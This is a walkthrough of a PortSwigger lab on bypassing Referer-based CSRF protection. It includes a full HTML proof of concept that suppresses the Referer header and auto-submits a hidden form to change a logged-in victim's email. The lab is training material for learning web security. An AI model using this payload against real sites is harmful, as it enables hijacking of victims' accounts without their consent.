## Welcome, my friend. Today we will start the [11. CSRF lab](https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-depends-on-header-being-present/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present#) in ```portswigger```

### Let's play this lab:

![image](https://github.com/user-attachments/assets/c0a9a6fa-ab3f-4a4b-8e4a-0f896bda6507)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/99660634-7727-4c7f-8071-ebe4c37f9432)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/f23f1607-2834-4634-98ed-cdc944f14bea)

#### Let's update email to ```0xT0R@gmail.com```:

![image](https://github.com/user-attachments/assets/5dda1c4b-12ff-4376-8e49-ed3a18ffe529)

#### We need do this task but through our victim by CSRF, we should intercept this request of update email by burp suite.

![image](https://github.com/user-attachments/assets/3d79151f-ae40-4bb3-b24c-1f7cb98259fb)

#### Ok, we notice exist ```referrer``` header and send request:

![image](https://github.com/user-attachments/assets/8da9b85b-914d-49f3-b4b5-13adf0e437c4)



### Let's generate csrf PoC but add this tag for prevent exist ```referrer``` header in new request:

```
<meta name="referrer" content="no-referrer">
```

### this csrf PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
	<head>
		<meta name="referrer" content="no-referrer">
	</head>
  <body>
    <form action="https://0a0600b503ee418188f670b5007100de.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/4c85db03-9a78-4694-add5-90e320c078a5)





-------

### Done! Congratulations, friends❤️‍🔥


<p align="center">
<img src="https://github.com/user-attachments/assets/3b87014d-172f-4875-a516-6a7ec771f44f" >
</p>
